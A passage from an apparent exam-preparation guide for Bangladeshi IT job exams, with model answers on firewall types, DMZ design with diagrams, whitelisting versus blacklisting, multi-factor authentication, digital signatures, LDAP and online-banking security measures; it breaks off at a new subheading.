   - Packet filtering firewall: examines each packet's source and destination IP address, port and protocol against an access control list. It is stateless, very fast and cheap, but it has no memory of context, so it can be defeated by fragmented or spoofed packets and cannot understand a session.
   - Stateful inspection firewall: maintains a connection table and permits a packet only if it belongs to a legitimate established session. It is far more secure than packet filtering and is the standard type today.
   - Circuit level gateway: works at the session layer, verifying the TCP handshake before allowing the session to proceed, but it does not inspect the content of the traffic.
   - Application level gateway, that is a proxy firewall: terminates the connection and rebuilds it, inspecting the full application content such as an HTTP request. Very secure, but slower, and a separate proxy is needed for each protocol.
   - Next Generation Firewall, NGFW: combines stateful inspection with deep packet inspection, application awareness, user identity, integrated intrusion prevention, TLS inspection and cloud threat intelligence.
   - Web Application Firewall, WAF: protects a web application specifically against SQL injection, cross site scripting and similar attacks by inspecting HTTP requests.
   - By deployment: hardware appliance, software or host based firewall such as Windows Defender Firewall and iptables, and cloud firewall or firewall as a service.

   Limitations to state: a firewall cannot stop an attack that arrives through an allowed channel, such as a phishing email over permitted HTTPS; it cannot protect against an insider who is already inside; it cannot inspect encrypted traffic unless TLS inspection is configured; and it is only as good as its rule set, so a badly maintained rule base is a common cause of exposure.
8. **Draw a diagram of LAN including network Firewall. Why is firewall important in network security? List 5 major types of network firewalls. Differentiate between Traditional Firewall and Next Generation Firewall.** *[Rupali Bank Ltd. Assistant Network Engineer 04.11.2023 compact it 532 (ET: MIST)]*


   Answer:

   Diagram of a LAN including a network firewall:

   ```mermaid
   graph LR
       A["Internet"] --> B["External Firewall"]
       B --> C["DMZ: Web server, Mail server, DNS server, Proxy"]
       C --> D["Internal Firewall"]
       D --> E["Internal LAN: workstations, database, file server"]
       B -.->|"blocked"| E
   ```

   - The design principle: a service that must be reachable from the Internet is placed in the DMZ, never on the internal LAN. If a public server is compromised, the attacker is still separated from the internal network by the second firewall, so the damage is contained. Traffic from the DMZ to the internal LAN is denied by default and permitted only for specific, tightly controlled flows, for example the web server reaching one database port.

   Why a firewall is important in network security:
   - It is the single controlled point at which the security policy is enforced between the trusted and untrusted networks, so a rule written once protects every host behind it.
   - It blocks unauthorised inbound access, which prevents direct attacks on internal servers and workstations.
   - It controls outbound traffic, which prevents data exfiltration and stops compromised machines contacting their command and control servers.
   - It hides the internal addressing through NAT, so the internal structure is not visible from outside.
   - It segments the network into zones, so that a compromise in one zone does not spread to another. This containment is what limits the damage of an inevitable breach.
   - It logs traffic, which provides both real time alerting and the evidence needed for investigation and audit.
   - It terminates VPNs, giving remote staff secure access without exposing internal services.
   - A modern firewall adds intrusion prevention, application control, user based policy and threat intelligence, so it becomes an active defence rather than a passive filter.
   - It is a regulatory requirement: the Bangladesh Bank ICT security guidelines, PCI DSS and ISO 27001 all require firewall controls at network boundaries.

   Five major types of network firewall:
   - Packet filtering firewall, which is stateless and inspects only the header.
   - Stateful inspection firewall, which tracks connections and is the current standard.
   - Circuit level gateway, which validates the session at layer 5 without inspecting content.
   - Application level gateway, that is a proxy firewall, which terminates and rebuilds the connection and inspects the full application content.
   - Next Generation Firewall, which combines all of these with deep packet inspection, application and user awareness and integrated threat prevention.

   Traditional firewall vs Next Generation Firewall:

   | Point | Traditional firewall | Next Generation Firewall |
   |---|---|---|
   | Inspection depth | Header only, that is IP, port and protocol | Deep packet inspection of the payload as well |
   | OSI layers covered | 3 and 4 | 3 to 7, including the application layer |
   | Application awareness | None; it sees only port 443 | Identifies the actual application, so Facebook and Dropbox on the same port 443 are distinguished |
   | User awareness | None; it sees only IP addresses | Integrates with Active Directory or LDAP, so policy can be written per user or group |
   | Threat prevention | None built in | Integrated IPS, antivirus, anti-bot and sandboxing |
   | Encrypted traffic | Cannot inspect it | TLS inspection: decrypt, inspect and re-encrypt |
   | Threat intelligence | None | Cloud feeds of known malicious addresses, domains and file hashes, updated continuously |
   | Policy style | Allow port 443 from this subnet | Allow the Finance group to use Salesforce but not file sharing |
   | Performance cost | Very low | High, so far more processing power is required |
   | Cost and complexity | Low | High, with subscription licences for the security services |

   - In short, a traditional firewall asks where the packet is going, while an NGFW asks who is sending it, what application it is, and whether it is carrying an attack.
9. **What is firewall and why it is used?** *[Dhaka Mass Transit Company Limited (DMTCL) Assistant Engineer (ICT) 27.01.2023 compact it 475 (ET: N/A)]*


   Answer:

   What a firewall is:
   - A firewall is a network security system, implemented in hardware, software or both, that monitors and controls incoming and outgoing network traffic according to a set of security rules. It sits at the boundary between a trusted network and an untrusted one and decides which traffic may cross.
   - Every packet is compared against an ordered rule set, and the first matching rule determines whether it is permitted or denied. A default deny rule at the end blocks everything not explicitly allowed.

   Why it is used:
   - To block unauthorised access from the Internet into the internal network, which is its primary purpose.
   - To control what leaves the network, which prevents data exfiltration and stops an infected machine reaching its command and control server.
   - To enforce the organisation's security policy at one controllable point rather than on every host.
   - To segment the network into zones, so that a compromise in one part is contained and cannot spread.
   - To create a DMZ, in which public facing servers are isolated from the internal LAN.
   - To hide the internal network structure through NAT.
   - To log traffic for monitoring, alerting, investigation and audit.
   - To terminate VPN connections, giving remote users secure access.
   - To provide, in a next generation firewall, intrusion prevention, application control, user based policy and malware inspection.
   - To satisfy regulatory requirements such as the Bangladesh Bank ICT security guidelines, PCI DSS and ISO 27001.

   Types: packet filtering, stateful inspection, circuit level gateway, application level or proxy firewall, next generation firewall, and web application firewall.
10. **What is the function of a firewall?** *[BCC Assistant Programmer 11.11.2023 compact it 545 (ET: N/A)]*


   Answer: The function of a firewall is to monitor all traffic crossing a network boundary and to permit or deny each packet according to a defined security policy.

   Its specific functions:
   - Traffic filtering: comparing each packet's source and destination address, port and protocol against an ordered rule set, and applying a default deny to anything not explicitly permitted.
   - Access control: allowing only authorised services and hosts to communicate, in either direction.
   - Stateful connection tracking: maintaining a table of established sessions, so that only packets belonging to a legitimate connection are accepted.
   - Network Address Translation: hiding the internal addressing behind one or a few public addresses.
   - Network segmentation: separating zones such as the DMZ, the user LAN, the server farm and the management network, so that a compromise is contained.
   - Logging and alerting: recording permitted and denied traffic for monitoring, investigation and audit.
   - VPN termination: providing encrypted remote access for staff and site to site tunnels between offices.
   - In a next generation firewall: deep packet inspection, application identification, user based policy, integrated intrusion prevention, malware inspection, URL filtering and TLS decryption.

   - What it does not do: it cannot stop an attack arriving through a permitted channel such as a phishing email over allowed HTTPS, it cannot protect against an insider already inside the perimeter, and it cannot see inside encrypted traffic unless inspection is configured. It is therefore one layer of defence in depth rather than a complete solution.
11. **DMZ and firewall placement in a diagram. (Approximate)** *[MGMCL Assistant Manager (ICT) 20.05.2022 compact it 651 (ET: BUET)]*


   Answer: The DMZ is placed between two firewalls, so that the servers reachable from the Internet are isolated from the internal LAN.

   ```mermaid
   graph LR
       A["Internet"] --> B["External Firewall"]
       B --> C["DMZ: Web server, Mail server, DNS server, Proxy"]
       C --> D["Internal Firewall"]
       D --> E["Internal LAN: workstations, database, file server"]
       B -.->|"blocked"| E
   ```

   - The design principle: a service that must be reachable from the Internet is placed in the DMZ, never on the internal LAN. If a public server is compromised, the attacker is still separated from the internal network by the second firewall, so the damage is contained. Traffic from the DMZ to the internal LAN is denied by default and permitted only for specific, tightly controlled flows, for example the web server reaching one database port.

   Placement rules:
   - The external firewall faces the Internet and permits only the specific public services: TCP 443 to the web server, TCP 25 and 587 to the mail server, and port 53 to the DNS server. Everything else inbound is denied.
   - The DMZ contains only the servers that must be reachable from outside: web, mail, DNS, reverse proxy, FTP and the VPN concentrator.
   - The internal firewall separates the DMZ from the internal LAN and denies all traffic by default. Only named flows are permitted, for example the web server reaching the application server on one specific port.
   - There is never a direct path from the Internet to the internal LAN. Any such rule destroys the purpose of the design.
   - Internal users reach the Internet through a proxy in the DMZ rather than directly.
   - Management access uses a separate out of band network reachable only from a hardened jump host.

   Two common designs:
   - Single firewall with three interfaces: Internet, DMZ and LAN, each with its own security zone. Cheaper, but the whole design depends on one device.
   - Dual firewall, the screened subnet: two separate firewalls, ideally from different manufacturers, so that a vulnerability in one does not defeat both. This is the design used by banks and by government.

   - Why it matters: a public server is the most exposed asset an organisation has and must be assumed to be compromised eventually. Placing it in the DMZ means that when that happens the attacker is still separated from the internal network by a second enforcement point, and the incident is contained rather than catastrophic.
12. **What is Blacklist and Whitelist? Write down the difference between Black list and White list.** *[SPCB Sub-Assistant Programmer 2022 compact it 737 (ET: N/A)]*


   Answer:

   Blacklist:
   - A blacklist is a list of items that are explicitly denied, while everything else is allowed by default. It is a negative security model.
   - Examples: antivirus signatures of known malware, spam blocklists of known bad senders, blocked IP addresses and domains, banned file extensions, and prohibited websites.

   Whitelist:
   - A whitelist is a list of items that are explicitly permitted, while everything else is denied by default. It is a positive security model.
   - Examples: application whitelisting on a server, a list of IP addresses allowed to reach an administrative interface, approved USB device identifiers, and an approved software catalogue.

   | Point | Blacklisting | Whitelisting |
   |---|---|---|
   | Default policy | Allow everything, deny what is on the list | Deny everything, allow only what is on the list |
   | List contains | Known bad items | Known good items |
   | Assumption | Everything is safe unless proved harmful | Everything is dangerous unless proved safe |
   | Protection against unknown threats | None; a new threat is not on the list, so it is allowed | Full; anything unknown is denied by default |
   | Maintenance effort | Constant, since the list must chase new threats | High at first, lower afterwards, but every legitimate change needs approval |
   | Flexibility for users | High | Low, which causes friction and requests for exceptions |
   | False positives | Few | Many at first, as legitimate items are wrongly blocked |
   | Suitable for | Environments needing openness: general web browsing, email spam filtering | High security and fixed function environments: ATMs, SCADA systems, servers, point of sale terminals |
   | Examples | Antivirus signatures, spam blocklists, blocked IP addresses, banned file extensions | Application whitelisting, allowed IP ranges on a management interface, permitted USB devices, approved software catalogue |

   Which is more secure and why:
   - Whitelisting is significantly more secure, and it should be stated as the answer.
   - The decisive reason is that blacklisting can only block what is already known. A new virus, a zero day exploit or a slightly modified variant is not on the list and is therefore allowed. Attackers change a few bytes and defeat a signature. Whitelisting reverses the default: anything not explicitly approved is denied, so an unknown threat is blocked without anyone having to know about it first.
   - Whitelisting also enforces the principle of least privilege and default deny, which is the foundation of secure design, and it produces a far smaller and more predictable attack surface.
   - Its cost is administrative: every legitimate new application, update or address must be approved, which is burdensome in a general purpose office and causes users to demand exceptions. This is why it is used where the set of legitimate items is small and stable, such as servers, ATMs and industrial control systems, and blacklisting is used where openness is essential.
   - In practice a layered approach is used: whitelisting at the perimeter and on critical systems, blacklisting for general user traffic, and both combined with behavioural detection that depends on neither list.
13. **What is DMZ in data center? Describe using diagram? Write the network devices in this system?** *[BDCCL Assistant Manager (Cyber Security) 14.10.2022 compact it 756 (ET: N/A)]*


   Answer:

   What a DMZ in a data centre is:
   - A DMZ, Demilitarized Zone, is a separate, isolated network segment placed between the untrusted external network and the trusted internal network, in which all the servers that must be reachable from outside are located.
   - Its purpose is containment. A public facing server is the most likely component to be compromised, so it is deliberately kept out of the internal network and a second enforcement point stands between it and the core systems. If the web server falls, the attacker has gained an isolated segment and not the database.
   - It is sometimes called a screened subnet or a perimeter network.

   ```mermaid
   graph LR
       A["Internet"] --> B["External Firewall"]
       B --> C["DMZ: Web server, Mail server, DNS server, Proxy"]
       C --> D["Internal Firewall"]
       D --> E["Internal LAN: workstations, database, file server"]
       B -.->|"blocked"| E
   ```

   - The design principle: a service that must be reachable from the Internet is placed in the DMZ, never on the internal LAN. If a public server is compromised, the attacker is still separated from the internal network by the second firewall, so the damage is contained. Traffic from the DMZ to the internal LAN is denied by default and permitted only for specific, tightly controlled flows, for example the web server reaching one database port.

   Rules that define it:
   - Internet to DMZ: permitted, but only for the specific published services and ports.
   - DMZ to internal: denied by default; only named hosts and ports where unavoidable, and every such flow logged.
   - Internet to internal: never permitted directly.
   - Internal to DMZ: permitted for management and for application traffic, from specific hosts only.
   - Servers in the DMZ hold no sensitive data themselves; they query the internal database through a tightly restricted channel.

   Network devices in this system:
   - Edge router, which connects to the ISP and provides the first coarse filtering with access control lists and anti-spoofing.
   - External firewall or NGFW, which faces the Internet and enforces the published service rules.
   - Internal firewall, ideally from a different vendor, which separates the DMZ from the internal network. Together with the external firewall this forms the dual firewall design.
   - Layer 2 and layer 3 switches, providing the DMZ VLAN and the internal VLANs, configured with port security, DHCP snooping and Dynamic ARP Inspection.
   - Load balancer or reverse proxy in front of the web servers, which also terminates TLS and hides the real servers.
   - Web Application Firewall protecting the web application specifically.
   - Intrusion Detection and Prevention System monitoring both the DMZ and the internal boundary.
   - VPN concentrator for remote access, terminating in the DMZ rather than inside.
   - Mail gateway with anti-spam and anti-malware filtering, and a DNS server serving only public records.
   - Out of band management switch and jump host, so that administration does not traverse the production path.
   - Log collector and SIEM, receiving logs from every device for correlation and alerting.

   - Single firewall variant: one firewall with three interfaces, Internet, DMZ and LAN, is cheaper but places the whole design on one device. The dual firewall design is used where the data is valuable, as in a bank.
14. **Difference between blacklisting and whitelisting. Which is more secure and why?** *[PGCB Assistant Engineer (CSE) 30.09.2021 compact it 864 (ET: BUET)]*


   Answer:

   | Point | Blacklisting | Whitelisting |
   |---|---|---|
   | Default policy | Allow everything, deny what is on the list | Deny everything, allow only what is on the list |
   | List contains | Known bad items | Known good items |
   | Assumption | Everything is safe unless proved harmful | Everything is dangerous unless proved safe |
   | Protection against unknown threats | None; a new threat is not on the list, so it is allowed | Full; anything unknown is denied by default |
   | Maintenance effort | Constant, since the list must chase new threats | High at first, lower afterwards, but every legitimate change needs approval |
   | Flexibility for users | High | Low, which causes friction and requests for exceptions |
   | False positives | Few | Many at first, as legitimate items are wrongly blocked |
   | Suitable for | Environments needing openness: general web browsing, email spam filtering | High security and fixed function environments: ATMs, SCADA systems, servers, point of sale terminals |
   | Examples | Antivirus signatures, spam blocklists, blocked IP addresses, banned file extensions | Application whitelisting, allowed IP ranges on a management interface, permitted USB devices, approved software catalogue |

   Which is more secure and why:
   - Whitelisting is significantly more secure, and it should be stated as the answer.
   - The decisive reason is that blacklisting can only block what is already known. A new virus, a zero day exploit or a slightly modified variant is not on the list and is therefore allowed. Attackers change a few bytes and defeat a signature. Whitelisting reverses the default: anything not explicitly approved is denied, so an unknown threat is blocked without anyone having to know about it first.
   - Whitelisting also enforces the principle of least privilege and default deny, which is the foundation of secure design, and it produces a far smaller and more predictable attack surface.
   - Its cost is administrative: every legitimate new application, update or address must be approved, which is burdensome in a general purpose office and causes users to demand exceptions. This is why it is used where the set of legitimate items is small and stable, such as servers, ATMs and industrial control systems, and blacklisting is used where openness is essential.
   - In practice a layered approach is used: whitelisting at the perimeter and on critical systems, blacklisting for general user traffic, and both combined with behavioural detection that depends on neither list.
15. **Write difference between Antivirus and Firewall.** *[BREB Assistant General Manager (IT) 2021 compact it 934 (ET: N/A)]*


   Answer:

   | Point | Antivirus | Firewall |
   |---|---|---|
   | Purpose | Detects, blocks and removes malicious software already on or entering the machine | Controls which network traffic may enter or leave |
   | Works on | Files, processes, memory and storage of a host | Packets and connections crossing a network boundary |
   | Layer | Application and host level | Network and transport level, and application level in an NGFW |
   | Threats addressed | Viruses, worms, Trojans, ransomware, spyware, rootkits | Unauthorised access, port scanning, intrusion attempts, unwanted services, data exfiltration |
   | Method | Signature matching, heuristic analysis, behavioural monitoring, sandboxing | Rule based filtering, stateful connection tracking, and deep packet inspection in an NGFW |
   | Scope | Usually one host, though managed centrally | Usually the whole network behind it |
   | Position | Installed on the endpoint or the server | Placed at the network perimeter or between zones |
   | Acts against | A threat that has already reached the system | A threat before it reaches the system |
   | Can it inspect file content | Yes, that is its whole purpose | Only in an NGFW with deep packet inspection |
   | If it fails | Malware executes and spreads | Unauthorised traffic reaches the internal network |
   | Examples | Windows Defender, Kaspersky, Bitdefender, Symantec, ClamAV | Cisco ASA, Palo Alto, FortiGate, pfSense, iptables, Windows Defender Firewall |

   - The relationship: they are complementary and neither replaces the other. A firewall stops unauthorised traffic at the boundary but cannot detect a virus in a permitted email attachment; an antivirus detects that virus on the machine but cannot stop a port scan or an intrusion attempt. Both are required, together with patching, backups and user awareness, in a defence in depth design.
   - Modern products blur the line: an NGFW performs malware inspection on traffic passing through it, and an endpoint protection platform includes a host firewall, so the two functions are often bought together.
16. **What is firewell? Draw a LAN network to showing firewall.** *[BREB Junior Assistant Manager (ICT) 2021 compact it 949 (ET: N/A)]*


   Answer:

   What a firewall is:
   - A firewall is a network security device or software that monitors and controls incoming and outgoing traffic according to a defined set of security rules, standing between a trusted internal network and an untrusted external network.
   - Each packet is compared against an ordered rule set and the first matching rule decides whether it is permitted or denied, with a default deny at the end so that anything not explicitly allowed is blocked.
   - Types: packet filtering, stateful inspection, circuit level gateway, application level or proxy firewall, next generation firewall, and web application firewall.
   - Purposes: blocking unauthorised access, controlling outbound traffic, segmenting the network, hiding internal addresses through NAT, logging for audit, and terminating VPNs.

   LAN network showing the firewall:

   ```mermaid
   graph LR
       A["Internet"] --> B["External Firewall"]
       B --> C["DMZ: Web server, Mail server, DNS server, Proxy"]
       C --> D["Internal Firewall"]
       D --> E["Internal LAN: workstations, database, file server"]
       B -.->|"blocked"| E
   ```

   - The design principle: a service that must be reachable from the Internet is placed in the DMZ, never on the internal LAN. If a public server is compromised, the attacker is still separated from the internal network by the second firewall, so the damage is contained. Traffic from the DMZ to the internal LAN is denied by default and permitted only for specific, tightly controlled flows, for example the web server reaching one database port.

   A simpler single firewall LAN, if that is what is wanted:

   ```
                    Internet
                        |
                   [ Router ]
                        |
                  [ FIREWALL ]  ---- DMZ: Web / Mail / DNS server
                        |
                   [ Switch ]
              /         |         \
        PC 1         PC 2        Server
                                (file, database)
   ```

   - The firewall sits between the router and the internal switch, so that every packet entering or leaving the LAN must pass through it and be checked against the policy. Public servers are placed on a separate DMZ interface rather than on the internal switch, so that their compromise does not expose the workstations and the database.

## Authentication & Access Control (15)

1. Multi-Factor Authentication (MFA) is mandatory in modern banking infrastructure. (a) Define the concept of MFA and explicitly list the three globally recognized categories of authentication factors. *[Combined Bank Officer (IT) 09.05.2026 debug it (ET: N/A)]*


   Answer:

   (a) Definition of Multi-Factor Authentication and the three categories of factor:

   - Multi-Factor Authentication is an access control method that requires a user to present two or more independent pieces of evidence, drawn from different categories, before identity is accepted. Two factor authentication is the case where exactly two are required.
   - The factors must come from different categories to be independent. Two passwords are both knowledge factors and give no additional assurance, because a single phishing page captures both.

   The three globally recognised categories:
   - Something you know, the knowledge factor: a password, a PIN, a passphrase or the answer to a security question.
   - Something you have, the possession factor: a mobile phone receiving an OTP, an authenticator application generating a time based code, a hardware token, a smart card, or a FIDO2 security key.
   - Something you are, the inherence factor: a biometric characteristic such as a fingerprint, a face, an iris pattern, a voice print or a palm vein pattern.
   - Two further categories are sometimes added in modern frameworks: somewhere you are, that is location or network based context, and something you do, that is behavioural biometrics such as typing rhythm or the way a phone is held.

   Why it is mandatory in banking:
   - Passwords are compromised constantly through phishing, credential stuffing from breaches elsewhere, reuse and malware. A second independent factor means that a stolen password alone achieves nothing, which prevents the great majority of account takeovers.
   - It is a regulatory requirement: the Bangladesh Bank ICT security guidelines, PCI DSS and the equivalent standards elsewhere all require multi-factor authentication for privileged access, remote access and customer transactions.
   - Practical caution: not all second factors are equal. SMS one time passwords can be defeated by SIM swapping and by a real time phishing proxy that relays the code as it is typed. Push approval with number matching is stronger, and a FIDO2 hardware key is phishing resistant because it verifies the site's domain cryptographically and cannot be replayed to a counterfeit site.
2. **টু-ফ্যাক্টর অথেনটিকেশন এবং ডিজিটাল সিগনেচার দিয়ে ডেটার সুরক্ষা কীভাবে করা হয়?** *[Assistant Programmer - Department of Immigration & Passports 15.07.2026 compact it 1464 (ET: N/A)]*


   Answer: Two factor authentication and digital signatures protect data in complementary ways: the first controls who may obtain access, and the second proves who produced the data and that it has not been altered.

   Protection through two factor authentication:
   - It requires two independent kinds of evidence, drawn from different categories: something you know, something you have and something you are.
   - The practical protection is that a stolen or guessed password alone is useless. Phishing, credential stuffing, brute force and keylogging all yield a password, and all of them fail at the second factor.
   - It protects the account and therefore the data behind it: unauthorised login, fraudulent fund transfer, unauthorised access to customer records and administrative takeover are all prevented.
   - It also produces an alert: an unexpected OTP or push request tells the genuine user that someone is attempting to use their credentials.
   - Strength depends on the factor chosen: an authenticator application is stronger than SMS, and a FIDO2 hardware key is stronger still, because it is phishing resistant.
   - It provides authentication and access control, but it does nothing for data once the session is open, and it does not protect data at rest or in transit.

   Protection through digital signatures:

   - A digital signature is a cryptographic mechanism that proves who created an electronic message or document and that it has not been altered since it was signed.
   - It is not a scanned image of a handwritten signature; it is a mathematical value computed from the document itself together with the signer's private key.

   How it works:
   - Signing: the sender computes a hash of the document with an algorithm such as SHA-256, then encrypts that hash with the sender's own private key. The result is the digital signature, which is attached to the document.
   - Verification: the receiver decrypts the signature with the sender's public key to recover the hash, computes the hash of the received document independently, and compares the two. If they match, the document is authentic and unaltered.
   - The hash is signed rather than the whole document, because asymmetric encryption is slow and a fixed length digest is far cheaper to sign than a large file.

   ```mermaid
   graph LR
       A["Document"] --> B["Hash function SHA-256"]
       B --> C["Message digest"]
       C --> D["Encrypt with sender's PRIVATE key"]
       D --> E["Digital signature attached to the document"]
       E --> F["Receiver"]
       F --> G["Decrypt with sender's PUBLIC key -> digest 1"]
       F --> H["Hash the received document -> digest 2"]
       G --> I{"digest 1 = digest 2 ?"}
       H --> I
       I -->|Yes| J["Authentic and unaltered"]
       I -->|No| K["Reject"]
   ```

   What it provides:
   - Authentication: only the holder of the private key could have produced the signature.
   - Integrity: any change to the document, even of a single bit, invalidates the signature.
   - Non-repudiation: the signer cannot later deny having signed it.
   - It does not provide confidentiality; the document must be separately encrypted if it is also to be kept secret.

   Algorithms: RSA, DSA and ECDSA, with SHA-256 as the hash.
   Role of the Certifying Authority: the public key must be bound to a verified identity by a digital certificate issued by a trusted CA within a Public Key Infrastructure. Without it an attacker could publish a key in someone else's name and the signature would verify against the wrong identity.

   How the two work together:
   - Two factor authentication answers the question "is this really the account holder attempting to act", at the moment of access.
   - A digital signature answers the questions "who produced this document or instruction, and has it been altered since", permanently and verifiably afterwards.
   - In a banking transaction both are used: multi-factor authentication admits the customer to the session, and the transaction instruction is then signed so that it cannot be altered in transit and cannot later be denied.
   - Neither provides confidentiality. Encryption, that is TLS in transit and encryption at rest, is the third element, and the three together give authentication, integrity, non-repudiation and confidentiality.
3. **ডিজিটাল সিগনেচার (Digital Signature) কী? এর কার্যকারিতা ব্যাখ্যা করুন।** *[Assistant Programmer - Department of Immigration & Passports 15.07.2026 compact it 1464 (ET: N/A)]*


   Answer:

   - A digital signature is a cryptographic mechanism that proves who created an electronic message or document and that it has not been altered since it was signed.
   - It is not a scanned image of a handwritten signature; it is a mathematical value computed from the document itself together with the signer's private key.

   How it works:
   - Signing: the sender computes a hash of the document with an algorithm such as SHA-256, then encrypts that hash with the sender's own private key. The result is the digital signature, which is attached to the document.
   - Verification: the receiver decrypts the signature with the sender's public key to recover the hash, computes the hash of the received document independently, and compares the two. If they match, the document is authentic and unaltered.
   - The hash is signed rather than the whole document, because asymmetric encryption is slow and a fixed length digest is far cheaper to sign than a large file.

   ```mermaid
   graph LR
       A["Document"] --> B["Hash function SHA-256"]
       B --> C["Message digest"]
       C --> D["Encrypt with sender's PRIVATE key"]
       D --> E["Digital signature attached to the document"]
       E --> F["Receiver"]
       F --> G["Decrypt with sender's PUBLIC key -> digest 1"]
       F --> H["Hash the received document -> digest 2"]
       G --> I{"digest 1 = digest 2 ?"}
       H --> I
       I -->|Yes| J["Authentic and unaltered"]
       I -->|No| K["Reject"]
   ```

   What it provides:
   - Authentication: only the holder of the private key could have produced the signature.
   - Integrity: any change to the document, even of a single bit, invalidates the signature.
   - Non-repudiation: the signer cannot later deny having signed it.
   - It does not provide confidentiality; the document must be separately encrypted if it is also to be kept secret.

   Algorithms: RSA, DSA and ECDSA, with SHA-256 as the hash.
   Role of the Certifying Authority: the public key must be bound to a verified identity by a digital certificate issued by a trusted CA within a Public Key Infrastructure. Without it an attacker could publish a key in someone else's name and the signature would verify against the wrong identity.

   Where it is used:
   - TLS certificates that authenticate websites, and the HTTPS handshake.
   - Signed email with S/MIME and PGP.
   - Software and driver code signing, so the operating system trusts the publisher.
   - Legally valid electronic documents, e-tendering and e-procurement. In Bangladesh, digital signature certificates issued under the ICT Act give an electronically signed document the same legal standing as a handwritten signature.
   - Banking instructions, tax returns, land records and government file movement in e-Nothi.
   - Signing transactions in blockchain and cryptocurrency.

   Effectiveness, that is what makes it work:
   - The private key never leaves the signer, so nobody else can produce a valid signature.
   - The hash function's avalanche property means that altering even one character of the document produces a completely different digest, so tampering is always detected.
   - Verification is public: anyone with the signer's certificate can check the signature without needing any secret, which is what makes it usable at scale.
   - It is legally recognised, so it can replace a handwritten signature on contracts, tenders and government files.
4. **(a) What is 2-factor authentication? Describe it with an example.** *[BPSC (Ministry of Power, Energy & Mineral Resources) Assistant Director (ICT) (CS/CSE) 29.05.2025 compact it 1356 (ET: N/A)], [BPSC Workshop Maintenance Engineer (CSE) 2021 compact it 796 (ET: N/A)]*


   Answer:

   - Two factor authentication requires a user to present two different kinds of evidence of identity before access is granted, so that a stolen password alone is not sufficient.
   - The two factors must come from different categories. Two passwords, or a password and a security question, are both knowledge factors and therefore do not constitute two factor authentication.

   The three globally recognised categories of authentication factor:
   - Something you know: a password, a PIN, a passphrase or the answer to a security question.
   - Something you have: a mobile phone receiving an OTP, a hardware token, a smart card, a FIDO2 security key, or an authenticator application generating a time based code.
   - Something you are: a biometric characteristic such as a fingerprint, a face, an iris pattern or a voice print.
   - Two further categories are sometimes added: somewhere you are, that is location or IP based, and something you do, that is behavioural biometrics such as typing rhythm.

   Example:
   - A customer logs in to internet banking. She first types her username and password, which is something she knows. The bank then sends a six digit one time password by SMS to her registered mobile number and she enters it; that is something she has, since it proves possession of the phone. Access is granted only when both succeed.
   - A second example: withdrawing money from an ATM needs the card, which is something you have, and the PIN, which is something you know. This is the oldest and most familiar case of two factor authentication.
   - A third: unlocking a banking application with a fingerprint, which is something you are, on a device already registered to the account, which is something you have.

   Why it matters:
   - Passwords are stolen constantly through phishing, data breaches, reuse across sites and malware. A second factor means a stolen password alone gains nothing, which prevents the great majority of account takeovers.
   - Limitations worth stating: SMS one time passwords can be defeated by SIM swapping or by a real time phishing proxy, so stronger factors are preferred — an authenticator application, push approval with number matching, or best of all a FIDO2 hardware key, which is phishing resistant because it verifies the site's domain cryptographically.
5. **Write down the full form of LDAP?** *[BARI Assistant Maintenance Engineer 15.11.2025 compact it 1451 (ET: N/A)]*


   Answer: LDAP stands for Lightweight Directory Access Protocol.

   - It is an application layer protocol used to query and modify a directory service, that is a hierarchical database of users, groups, computers and other network resources. It runs over TCP port 389, and port 636 for LDAPS, which is LDAP over TLS.
   - The directory is organised as a tree, the Directory Information Tree, and each entry is identified by a Distinguished Name such as `cn=Rahim,ou=Finance,dc=bank,dc=com`.
   - Its principal use is centralised authentication and authorisation: instead of every application keeping its own user list, applications query the directory, so a user has one account and one password across the organisation, and disabling that account removes access everywhere at once.
   - Implementations: Microsoft Active Directory, which is the most widely deployed, OpenLDAP, Apache Directory and Oracle Internet Directory.
   - Operations: bind to authenticate, search, add, modify, delete and unbind.
   - It is called lightweight because it is a simplified version of the earlier X.500 Directory Access Protocol, which was heavy and ran over the full OSI stack.
6. **Your bank has an online banking system and this process is performed by sending OTP in mobile or OTP in mail when a customer transfers money from a mobile banking app or online. This is a secured policy. Without this biometric policy, how can you more secure your online banking? Explain your strategy.** *[Combined Bank Assistant Maintenance Engineer/ Assistant Engineer (IT) 24.02.2024 compact it 306 (ET: BIBM)]*


   Answer: The question asks how to strengthen online banking beyond an SMS or email OTP, without relying on biometrics. The strategy is layered, because no single control is sufficient.

   Stronger authentication factors than SMS OTP:
   - Authenticator application with time based one time passwords, such as Google Authenticator or Microsoft Authenticator. The code is generated on the device itself and never travels over the mobile network, so SIM swapping and SMS interception are defeated.
   - Push based approval with number matching: the customer approves the transaction in the banking application and must type a number shown on the merchant or login screen. This defeats the fatigue attack in which a user approves a push notification carelessly.
   - FIDO2 or WebAuthn security keys and passkeys. This is the strongest option available and it is phishing resistant, because the key verifies the site's actual domain cryptographically and will not respond to a counterfeit site, however convincing it looks.
   - Hardware or software token with transaction signing: the customer enters the beneficiary account number and the amount into the token, which returns a code computed from them. The code is valid only for that specific transaction, so a man in the middle cannot alter the beneficiary or the amount after approval. This is what defeats the most dangerous attack against internet banking.
   - Public key infrastructure with a client certificate on the device, so that the device itself is authenticated.

   Device and channel controls:
   - Device binding and registration: an account can be operated only from devices the customer has registered, and adding a new device requires a stronger verification step.
   - Device fingerprinting and integrity checks: detect a rooted or jailbroken phone, an emulator, a debugger or a screen sharing tool, and refuse to run.
   - Certificate pinning in the mobile application, so that a proxy cannot intercept the traffic even with a fraudulent certificate.
   - Mobile application shielding and anti-tampering, and blocking of overlay attacks and accessibility service abuse, which is how Android banking Trojans steal credentials.

   Transaction level controls:
   - Risk based, adaptive authentication: score every transaction on device, location, time, amount, beneficiary and behaviour, and challenge only when the risk is high. This is more secure and less irritating than challenging everyone equally.
   - Transaction signing for high value or high risk operations, as described above.
   - Beneficiary management: a cooling off period before a newly added beneficiary can receive a large amount, and a separate confirmation to add one.
   - Velocity, amount and daily limits, and separate limits for new beneficiaries.
   - Out of band confirmation for large transfers, for example a call-back from the bank.
   - Positive pay style confirmation, in which the customer confirms the beneficiary details displayed by an independent channel.

   Detection and monitoring:
   - Behavioural analytics: build a profile of how each customer normally uses the service — typing rhythm, navigation pattern, usual times, usual amounts — and flag deviations. This is behavioural, not physiological biometrics, so it meets the constraint of the question.
   - Real time fraud detection scoring every transaction with machine learning, and automatic hold on suspicious activity.
   - Geo-velocity checks: a login from Dhaka followed by one from another country within minutes is impossible.
   - Immediate notification to the customer of every transaction and of every profile change, through an independent channel, so that fraud is detected within minutes.
   - Session controls: short timeouts, single active session, and re-authentication before sensitive operations.

   Application and infrastructure security:
